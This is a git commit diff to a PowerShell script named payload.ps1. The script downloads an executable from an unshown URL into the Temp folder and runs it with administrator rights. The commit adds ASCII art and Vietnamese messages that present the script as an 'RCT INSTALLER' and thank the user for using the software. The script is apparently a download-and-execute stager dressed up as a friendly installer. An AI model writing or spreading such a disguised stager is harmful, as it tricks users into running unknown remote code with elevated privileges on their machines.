45e449263993c3aff34ae8d8a8449fc34d3f57c8
Dao Le Quoc Anh <133498656+Anhdeface@users.noreply.github.com>
2025-03-17 14:32:29 +0700

    Update payload.ps1

--- payload.ps1
+++ payload.ps1
@@ -4,15 +4,38 @@ $output = "$env:Temp\RCT_Installer.exe"
 
 $webclient = New-Object System.Net.WebClient
 $webclient.DownloadFileAsync([Uri]$url, $output)
+Clear-Host
+$ascii = @"
 
+     ___------__
+ |\__-- /\       _-
+ |/    __      -
+ //\  /  \    /__
+ |  o|  0|__     --_
+ \\____-- __ \   ___-
+ (@@    __/  / /_
+    -_____---   --_
+     //  \ \\   ___-
+   //|\__/  \\  \
+   \_-\_____/  \-\
+        // \\--\|   -RCT INSTALLER
+   ____//  ||_
+  /_____\ /___\
+______________________
+Tốc độ tải xuống phụ thuộc vào đường truyền mạng
+Cảm ơn bạn đã sử dụng phần mềm<3
+
+
+"@
+Write-Host $ascii
 while ($webclient.IsBusy) {
     Write-Host "Đang tải xuống..."
-    Start-Sleep -Seconds 1
+    Start-Sleep -Seconds 3
 }
 
 # Chạy file setup.exe với quyền admin
 Start-Process -FilePath $output -Verb RunAs
 
-Write-Host "Đã tải xong!"
+Write-Host "Đã tải xong! Bạn có thể thiết lập phần mềm"
 
 
